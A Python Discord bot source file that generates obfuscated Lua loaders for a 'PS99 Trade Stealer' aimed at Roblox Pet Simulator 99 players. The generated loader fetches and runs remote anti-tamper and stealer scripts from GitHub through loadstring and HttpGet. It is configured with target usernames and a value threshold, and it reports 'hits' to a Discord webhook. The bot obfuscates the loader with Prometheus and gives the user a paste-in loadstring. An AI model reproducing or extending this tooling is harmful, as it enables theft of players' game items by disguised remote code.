import discord
from discord.ext import commands
import requests
import os
import asyncio
import subprocess
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PASTEFY_API_KEY = os.getenv("PASTEFY_API_KEY")

# ==================== URLs ====================
ANTI_TAMPER_URL = "https://raw.githubusercontent.com/dino242/Moneyyyy/main/anti.lua"
PS99_STEALER_URL = "https://raw.githubusercontent.com/dino242/Moneyyyy/main/main-stealer.lua"

PROMETHEUS_DIR = "Prometheus"

def setup_prometheus():
    if not os.path.exists(PROMETHEUS_DIR):
        print("Cloning Prometheus...")
        subprocess.run(["git", "clone", "--depth", "1", "https://github.com/prometheus-lua/Prometheus.git", PROMETHEUS_DIR], check=True)

def obfuscate_with_prometheus(script_content: str) -> str:
    try:
        with open("temp_loader.lua", "w", encoding="utf-8") as f:
            f.write(script_content)
        result = subprocess.run(["lua", f"{PROMETHEUS_DIR}/cli.lua", "--preset", "Strong", "temp_loader.lua"], 
                              capture_output=True, text=True, timeout=25)
        if result.returncode == 0 and os.path.exists("temp_loader.lua.obfuscated.lua"):
            with open("temp_loader.lua.obfuscated.lua", "r", encoding="utf-8") as f:
                return f.read()
        return script_content
    except:
        return script_content
    finally:
        for f in ["temp_loader.lua", "temp_loader.lua.obfuscated.lua"]:
            if os.path.exists(f): os.remove(f)

# Progress & Upload bleiben gleich...

# ------------------------ UI & Modal (erweitert) ------------------------
class PS99Button(discord.ui.View):
    @discord.ui.button(label="PS99 Trade Stealer", style=discord.ButtonStyle.danger, emoji="🔄")
    async def ps99_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(PS99Modal())

class PS99Modal(discord.ui.Modal, title="PS99 Trade Stealer Config - babageyus"):
    usernames = discord.ui.TextInput(label="Roblox Usernames", placeholder="user1,user2,user3", required=True)
    min_value = discord.ui.TextInput(label="Minimum Value (RAP)", default="1000000", required=True)
    ping = discord.ui.TextInput(label="Ping Everyone on Hit? (yes/no)", default="yes", required=False)
    delay = discord.ui.TextInput(label="Check Delay (seconds)", default="1", required=False)
    webhook = discord.ui.TextInput(label="Webhook URL (optional)", placeholder="Leave empty = private channel", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await generate_ps99_script(interaction, 
            self.usernames.value, 
            self.min_value.value,
            self.ping.value,
            self.delay.value,
            self.webhook.value or None)

# ------------------------ Generator ------------------------
async def generate_ps99_script(interaction, usernames_raw, min_value, ping, delay, webhook):
    users = [u.strip().strip("\"'") for u in usernames_raw.split(",") if u.strip()]
    if not users:
        return await interaction.followup.send("⚠ Provide at least one username.", ephemeral=True)

    final_webhook = webhook
    channel_link = None
    if not webhook:
        final_webhook, channel = await create_private_channel_and_webhook(interaction.user, interaction.guild)
        channel_link = channel.mention

    lua_users = ", ".join(f'"{u}"' for u in users)

    loader = f'''-- babageyus PS99 Trade Stealer Loader
loadstring(game:HttpGet("{ANTI_TAMPER_URL}", true))()

_G.BabageyusTradeConfig = {{
    usernames = {{ {lua_users} }},
    min_value = {min_value},
    pingEveryone = "{ping.lower()}",
    checkDelay = {delay},
    webhook = "{final_webhook}"
}}

loadstring(game:HttpGet("{PS99_STEALER_URL}", true))()
'''

    msg = await send_progress(interaction, "Generating & Obfuscating babageyus PS99 Stealer...")

    obfuscated = obfuscate_with_prometheus(loader)
    raw = upload_script(obfuscated)
    loadstring_code = f'loadstring(game:HttpGet("{raw}", true))()' if raw else obfuscated

    embed = discord.Embed(title="babageyus PS99 Trade Stealer Ready! 🛡️", color=0x2ecc71)
    embed.add_field(name="Targets", value=", ".join(users[:8]), inline=False)
    embed.add_field(name="Min Value", value=min_value, inline=True)
    embed.add_field(name="Ping", value=ping, inline=True)
    embed.add_field(name="Delay", value=delay, inline=True)
    embed.add_field(name="Loadstring", value=f"```lua\n{loadstring_code}\n```", inline=False)
    if channel_link:
        embed.add_field(name="Hits Channel", value=channel_link, inline=False)

    # Copy Button...
    class Copy(discord.ui.View):
        @discord.ui.button(label="Copy Loadstring", style=discord.ButtonStyle.success, emoji="📋")
        async def copy_btn(self, i, b):
            await i.response.send_message(f"```lua\n{loadstring_code}\n```", ephemeral=True)

    await msg.edit(embed=embed, view=Copy())

# Rest des Bots (Commands, on_ready, etc.) bleibt gleich wie in der letzten Version
